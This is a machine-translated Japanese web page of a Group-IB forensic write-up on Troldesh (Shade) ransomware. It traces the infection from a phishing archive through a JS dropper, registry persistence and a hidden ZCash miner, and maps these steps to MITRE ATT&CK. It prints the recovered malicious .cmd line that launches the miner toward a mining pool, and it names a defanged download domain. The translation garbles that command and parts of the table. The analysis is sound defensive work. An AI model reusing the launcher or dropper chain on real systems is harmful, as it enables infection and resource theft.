<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧖🏽 🙋🏽 📎 あなたの後に残っているのはそれだけです：Troldeshランサムウェア（シェード）のフォレンジックアーティファクト 🈷️ 👊🏿 🚳</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ニュース をフォローすれば、サイバー犯罪者の間で最も人気のある暗号ロッカーの1つである、Troldesh（Shade）ランサムウェアウイルスのロシア企業に対する新しい大規模攻撃についておそらく知っているでしょう。 6月だけでも、Group-IBは主要航空会社、自動車ディーラー、メディアの従業員に代わ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>あなたの後に残っているのはそれだけです：Troldeshランサムウェア（シェード）のフォレンジックアーティファクト</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/group-ib/blog/457592/"><img src="https://habrastorage.org/webt/tx/fa/y5/txfay55dbgafekaewi9vtxtv5nw.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ニュース</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
をフォローすれば</font><font style="vertical-align: inherit;">、サイバー犯罪者の間で最も人気のある暗号ロッカーの1つである、Troldesh（Shade）ランサムウェアウイルスのロシア企業に対する新しい大規模攻撃についておそらく知っているでしょう。 6月だけでも、Group-IBは主要航空会社、自動車ディーラー、メディアの従業員に代わって送信されたTroldeshからのフィッシングメールを1,100通以上発見しました。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この記事では、侵害されたデバイスの情報媒体に対するShade / Troldesh攻撃の後に見つかるフォレンジックアーティファクトを調べ、攻撃者が使用する戦術と手法をMITER ATT＆CKと比較します。</font><font style="vertical-align: inherit;">Group-IBの主要な法医学専門家、</font><b><font style="vertical-align: inherit;">Oleg Skulkin</font></b></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
による投稿</font></font><b><font style="vertical-align: inherit;"></font></b><font style="vertical-align: inherit;"></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Troldesh（Shade、XTBL、Trojan.Encoder.858、Da Vinci、No_more_ransomeとも呼ばれます）は、ユーザーの感染したデバイス上のファイルを暗号化するウイルスであり、情報へのアクセスを回復するには身代金が必要です。 Troldeshとの最近のキャンペーンは、ファイルを暗号化するだけでなく、暗号通貨マイニングも行い、Webサイトへのトラフィックを生成して、オンライン広告からのトラフィックと収益を増加させることを示しています。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
トロルデシュの活動が2015年にGroup-IBの専門家によって初めて検出されたとき、彼らはウイルスがアンチウイルス保護ツールを首尾よく回避したことに気づきました。</font><font style="vertical-align: inherit;">攻撃者は定期的に「パッカー」を変更しました。これは、ファイルサイズを小さくし、検出とリバースを困難にするパッカープログラムです。そのため、ウイルス対策プログラムはしばしばそれをスキップしました。</font><font style="vertical-align: inherit;">2018年末までに、Troldeshは最も人気のあるウイルスの1つになり、RTMとPonyとともに自信を持ってトップ3に入りました。</font><font style="vertical-align: inherit;">PaloAlto Networksの専門家によると、Troldeshはロシアの目的だけでなく、ランサムウェアの影響を受ける国には、米国、日本、インド、タイ、カナダがあります。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">初期感染ベクター</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
通常、「Troldesh / Shade」は、暗号化ロッカーがダウンロードされて起動された後、悪意のあるJSファイルを含むパスワードで保護されたアーカイブなど、悪意のある添付ファイルを含むフィッシングメールを介して配布されます。</font><font style="vertical-align: inherit;">どういう意味ですか？</font><font style="vertical-align: inherit;">そのようなアーカイブのオープンの痕跡を分析することから私たちの研究を始めることは良い考えでしょう。</font><font style="vertical-align: inherit;">そのような痕跡はどこにありますか？</font><font style="vertical-align: inherit;">たとえば、ジャンプリストでは：</font></font><br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/hh/k-/yp/hhk-ypo6ixpvwwayr35d2b_u1qg.png" alt="画像代替"></div><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JLECmdを使用してファイル5f7b5f1e01b83767.automaticDestinations-msから抽出されたデータしたがっ</font></font><br>
</i><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
て、ユーザーが「password 11.rar about ordering」という名前でアーカイブを開いたことがわかります。</font><font style="vertical-align: inherit;">しかし、彼はどのようにしてシステムに入りましたか？</font><font style="vertical-align: inherit;">ファイルはDownloadsディレクトリにあります。おそらくインターネットからダウンロードされたものです。</font><font style="vertical-align: inherit;">ブラウザの履歴を見てみましょう：</font></font><br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/ws/bd/p_/wsbdp_7cry0lrxupqxpultymp3w.png" alt="画像代替"></div><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Belkasoft Evidence Centerを使用してWebCache01.datファイルから抽出されたデータ</font></font><br>
</i><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
ご覧のとおり、ファイルはMicrosoft Edge Webブラウザーを使用してダウンロードされ、Downloadsディレクトリに保存されています。</font><font style="vertical-align: inherit;">さらに、ダウンロードの直前にユーザーがWebメールサイトにアクセスしたため、アーカイブは電子メールで受信されました。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、ここでは最も一般的な手法であるT1193-「スピアフィッシングアタッチメント」を扱っています。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保護メカニズムの開始とバイパス</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
アーカイブ内を見ると、ほぼ同じ名前のJSファイルが見つかります。マルウェアが読み込まれて動作を開始するには、指定されたファイルをダブルクリックする必要があります。その後、「wscript.exe」がJSファイルを起動します。これにより、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mat.tradetoolsfx</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> [。] Com </font><font style="vertical-align: inherit;">から悪意のあるファイルがダウンロードされ、</font><font style="vertical-align: inherit;">実行されます。ディスク上にこの痕跡を見つけることができますか？もちろん！</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
wscript.exeのプリフェッチファイルを調べて、そのファイルが操作したファイルに注目します。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
&lt;...&gt; </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
\ VOLUME {01d3dcb4976cd072-3a97874f} \ USERS \ 0136 \ APPDATA \ LOCAL \ MICROSOFT \ WINDOWS \ INETCACHE \ IE \ OEJ87644 1] .JPG </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
\ボリューム{01d3dcb4976cd072-3a97874f} \ USERS \ 0136 \ APPDATA \ LOCAL \ TEMP \ 7ZO84024637 \ ORDER DETAILS .JS </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
&lt;...&gt;</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、2つの興味深いファイルがあります。</font><font style="vertical-align: inherit;">最初に、アーカイブにあったJSファイルの名前がわかりました。次に、ダウンロードしたファイルの名前がわかりました。</font><font style="vertical-align: inherit;">それがどこからダウンロードされたかを知る時が来ました。</font><font style="vertical-align: inherit;">WebCache01.datをもう一度見てみましょう。</font></font><br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/1u/4v/9_/1u4v9_9f9ulw6w11yfm7ftvu-ns.png" alt="画像代替"></div><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ESEDatabaseViewを使用してWebCache01.datファイルから取得したデータ</font></font><br>
</i><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
ResponseHeadersフィールドのコンテンツをデコードすると、次の結果が得られ</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ます。HTTP / 1.1 200 OK </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Content-Type：image / jpeg </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Content-Length：1300656 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ETag：“ 5ced19b6-13d8b0” </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Strict- Transport-Security：max-age = 31536000; </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
実際、これはJPGファイルではなく、Shadeのインスタンスを復号化して起動する実行可能ファイルです。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
では、ここではどのようなテクニックを扱っていますか？</font><font style="vertical-align: inherit;">スクリプト（T1064）、ユーザー実行（T1204）、およびマスカレード（T1036）。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">システムピン</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
「Shade」は、システムに修正するかなり平凡な方法を使用します-レジストリキー「Software \ Microsoft \ Windows \ CurrentVersion \ Run」（T1060）。</font><font style="vertical-align: inherit;">悪意のあるJSファイルがユーザー「0136」によって開かれたことはすでにわかっているので、対応するファイル「NTUSER.DAT」を見てください。</font></font><br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/w-/q9/fd/w-q9fdff43kczyndmw7ak9xdgxg.png" alt="画像代替"></div><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Belkasoft Evidence Centerを使用して発見された、システムのロックメカニズム</font></font><br>
</i><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
しかし、それだけではありません！</font><font style="vertical-align: inherit;">さらに興味深い：</font></font><br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/gm/hl/mz/gmhlmzuplqi7rketrgukc_thomi.png" alt="画像代替"></div><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Belkasoftエビデンスセンターを使用して検出されたシステムのロックメカニズム</font></font><br>
</i><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
図に示されているように、C：\ ProgramData \ SysWOW64 \ leWRX7w.cmdを指す別の興味深いエントリがあります。このファイルの内容を見てみましょう：</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
echo CreateObject（ "Wscript.Shell"）。 "" ^＆WScript.Arguments（0）^＆ ""、0、False&gt; "％TEMP％/ pxNXSB.vbs" &amp;&amp; start / WAITを実行します。 wscript.exe "％TEMP％/ pxNXSB.vbs" "C：\ Users \ 0136 \ AppData \ Roaming \ SOFTWA〜1 \ NHEQMI〜1.EXE -l eu1-zcash.flypool.org//333 -u t1L9iBXyRgaYrQ5JSTSdstopV6pHtZ2Xde1D282Dde t 1 "&amp;&amp; del"％TEMP％\ pxNXSB.vbs " </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、もう1つのファイルがあります。その内容から判断すると、ZCash暗号通貨をマイニングするために攻撃者が使用します。したがって、被害者が身代金を支払ったとしても、彼女のシステムのリソースは依然としてサイバー犯罪者によって使用されます。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">効果</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
まず第一に、「Shade」はクリプトクロッカーであるため、最初に目を引くのは、拡張子「CRYPTED000007」、「Read Me」ファイルを含む多数のファイル、およびデスクトップ上の「新鮮な」壁紙です。</font></font><br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/xc/wd/pv/xcwdpvfzo6gdobpsq6yyuiwozmg.png" alt="画像代替"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このイメージのファイルは、C：\ Users \％username％\ AppData \ Roamingディレクトリにあります。</font><font style="vertical-align: inherit;">どのような機器を扱っていますか？</font><font style="vertical-align: inherit;">「影響のために暗号化されたデータ」（T1486）。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、すでに理解したように、「Shade」は通常の暗号ロッカーではありません。</font><font style="vertical-align: inherit;">クリプトクロッカー自体に加えて、鉱山労働者も見つかりました。つまり、「リソースハイジャック」という別の手法について言及する価値があります。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">マイターアット＆CK</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちの分析により、Shadeディストリビューターの多くの戦術とテクニックが明らかになりました。要約しましょう。</font></font><br>
<br>
<div class="scrollable-table"><table>
<tbody><tr>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ID</font></font></th>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名前</font></font></th>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></th>
</tr>
<tr>
<td><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">T1193</font></font></b></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">スピアフィッシングアタッチメント</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Shadeは、悪意のある添付ファイルを含むフィッシングメールを介して配布されます</font></font></td>
</tr>
<tr>
<td><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">T1204</font></font></b></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ユーザー実行</font></font></td>
<td>JS-          .</td>
</tr>
<tr>
<td><b>T1064</b></td>
<td>Scripting</td>
<td>  JS-    </td>
</tr>
<tr>
<td><b>T1036</b></td>
<td>Masquerading</td>
<td>     «JPG»  «EXE»</td>
</tr>
<tr>
<td><b>T1060</b></td>
<td>Registry Run Keys / Startup Folder</td>
<td>«Shade»    «Software\Microsoft\Windows\CurrentVersion\Run»    </td>
</tr>
<tr>
<td><b>T1486</b></td>
<td>Data Encrypted for Impact</td>
<td>«Shade»      </td>
</tr>
<tr>
<td><b>T1496</b></td>
<td>Resource Hijacking</td>
<td>«Shade»       </td>
</tr>
</tbody></table></div></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja457576/index.html">KnowledgeConf-離陸したかどうか？</a></li>
<li><a href="../ja457578/index.html">ニューロモーフィックシステム：人間の脳に触発されたコンピューター</a></li>
<li><a href="../ja457580/index.html">JavaScript：単純なMEVNアプリケーションの作成</a></li>
<li><a href="../ja457582/index.html">汗、涙、時間の追跡-会社の収益性を向上させる方法</a></li>
<li><a href="../ja457588/index.html">Barcamp-村での最初の公開イベント</a></li>
<li><a href="../ja457596/index.html">OSDay 19またはC言語がまだ生きている理由</a></li>
<li><a href="../ja457600/index.html">ヘッドセットの概要Snom A150、Snom A100MおよびD</a></li>
<li><a href="../ja457602/index.html">DBMS MS SQL Server Developer 2016およびPostgreSQL 10.5 for 1Cのパフォーマンスの調査</a></li>
<li><a href="../ja457606/index.html">アラン・ケイ：コンピューターが可能にした最も素晴らしいものと言えるもの</a></li>
<li><a href="../ja457608/index.html">データを説得力のあるストーリーに視覚化する方法</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>